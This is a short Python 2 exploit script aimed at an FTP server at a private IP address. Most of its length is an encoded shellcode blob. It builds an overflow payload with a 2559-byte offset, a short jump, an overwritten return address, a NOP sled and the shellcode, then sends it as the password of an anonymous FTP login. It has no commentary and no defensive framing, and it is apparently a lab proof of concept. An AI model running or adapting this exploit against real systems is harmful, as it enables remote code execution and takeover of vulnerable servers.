#!/usr/bin/python

import socket
from ftplib import FTP
from struct import pack

host = '172.16.192.168'
port = 21
max_size = 3500
eip_offset = 2559

shellcode =  ""
shellcode += "\xdb\xcd\xbb\xab\x9b\xfd\xb9\xd9\x74\x24\xf4\x5f"
shellcode += "\x2b\xc9\xb1\x56\x83\xc7\x04\x31\x5f\x14\x03\x5f"
shellcode += "\xbf\x79\x08\x45\x57\xff\xf3\xb6\xa7\x60\x7d\x53"
shellcode += "\x96\xa0\x19\x17\x88\x10\x69\x75\x24\xda\x3f\x6e"
shellcode += "\xbf\xae\x97\x81\x08\x04\xce\xac\x89\x35\x32\xae"
shellcode += "\x09\x44\x67\x10\x30\x87\x7a\x51\x75\xfa\x77\x03"
shellcode += "\x2e\x70\x25\xb4\x5b\xcc\xf6\x3f\x17\xc0\x7e\xa3"
shellcode += "\xef\xe3\xaf\x72\x64\xba\x6f\x74\xa9\xb6\x39\x6e"
shellcode += "\xae\xf3\xf0\x05\x04\x8f\x02\xcc\x55\x70\xa8\x31"
shellcode += "\x5a\x83\xb0\x76\x5c\x7c\xc7\x8e\x9f\x01\xd0\x54"
shellcode += "\xe2\xdd\x55\x4f\x44\x95\xce\xab\x75\x7a\x88\x38"
shellcode += "\x79\x37\xde\x67\x9d\xc6\x33\x1c\x99\x43\xb2\xf3"
shellcode += "\x28\x17\x91\xd7\x71\xc3\xb8\x4e\xdf\xa2\xc5\x91"
shellcode += "\x80\x1b\x60\xd9\x2c\x4f\x19\x80\x38\xbc\x10\x3b"
shellcode += "\xb8\xaa\x23\x48\x8a\x75\x98\xc6\xa6\xfe\x06\x10"
shellcode += "\xbf\xe9\xb8\xce\x07\x79\x47\xef\x77\x53\x8c\xbb"
shellcode += "\x27\xcb\x25\xc4\xac\x0b\xc9\x11\x58\x06\x5d\x36"
shellcode += "\x8c\xd6\x77\x2e\xae\xd6\x99\x60\x27\x30\xf5\x2e"
shellcode += "\x67\xed\xb6\x9e\xc7\x5d\x5f\xf5\xc8\x82\x7f\xf6"
shellcode += "\x03\xab\xea\x19\xfd\x83\x82\x80\xa4\x58\x32\x4c"
shellcode += "\x73\x25\x74\xc6\x71\xd9\x3b\x2f\xf0\xc9\x2c\x48"
shellcode += "\xfa\x11\xad\xfd\xfa\x7b\xa9\x57\xad\x13\xb3\x8e"
shellcode += "\x99\xbb\x4c\xe5\x9a\xbc\xb3\x78\xaa\xb7\x82\xee"
shellcode += "\x92\xaf\xea\xfe\x12\x30\xbd\x94\x12\x58\x19\xcd"
shellcode += "\x41\x7d\x66\xd8\xf6\x2e\xf3\xe3\xae\x83\x54\x8c"
shellcode += "\x4c\xfd\x93\x13\xaf\x28\xa0\x54\x4f\xae\x8f\xfc"
shellcode += "\x27\x50\x90\xfc\xb7\x3a\x10\xad\xdf\xb1\x3f\x42"
shellcode += "\x2f\x39\xea\x0b\x27\xb0\x7b\xf9\xd6\xc5\x51\x5f"
shellcode += "\x46\xc5\x56\x44\x79\xbc\x17\x7b\x7a\x41\x3e\x18"
shellcode += "\x7b\x41\x3e\x1e\x40\x97\x07\x54\x87\x2b\x3c\x67"
shellcode += "\xb2\x0e\x15\xe2\xbc\x1d\x65\x27"

#\x00\x0a\x0d\x20
payload = "\x2c" + "A" * eip_offset
payload += "\xEB\x10\x90\x90"
payload += pack("<L",0x10012462)
payload += "\x90" * 20
payload += shellcode
payload += "C" * (max_size - len(payload))
print "[*] Sending payload of size: {0}".format(len(payload))
ftp = FTP(host)
ftp.login('anonymous',payload)
ftp.close()
